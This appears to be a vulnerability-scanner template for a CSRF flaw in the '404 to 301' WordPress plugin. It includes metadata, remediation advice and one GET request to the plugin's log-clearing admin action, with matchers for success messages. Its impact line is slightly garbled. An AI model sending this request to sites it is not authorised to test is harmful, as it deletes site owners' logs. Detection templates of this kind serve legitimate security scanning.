id: CVE-2021-24766

info:
  name: CSRF Logs Deletion in 404 to 301 WordPress Plugin
  author: ProjectDiscoveryAI
  severity: medium
  description: The 404 to 301 â€“ Redirect, Log and Notify 404 Errors WordPress plugin before 3.0.9 does not have CSRF check in place when cleaning the logs, which could allow attackers to make a logged-in admin delete all logs via a CSRF attack.
  impact: |
    An attacker can delete CSRF logs leading to potential data loss or unauthorized access.
  remediation: |
    Update to the latest version of 404 to 301 WordPress Plugin to mitigate the CSRF vulnerability.
  reference: https://wpscan.com/vulnerability/cc13db1e-5f7f-49b2-81da-f913cfe70543
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N
    cvss-score: 6.5
    cve-id: CVE-2021-24766
    cwe-id: CWE-352
    epss-score: 0.00063
    epss-percentile: 0.29066
    cpe: cpe:2.3:a:404_to_301_project:404_to_301:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: 404_to_301_project
    product: 404_to_301
    framework: wordpress

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-admin/admin.php?page=jj4t3-logs&action=bulk_clean"

    matchers:
      - type: word
        words:
          - "Logs deleted successfully"
          - "All logs have been cleaned"
        part: body
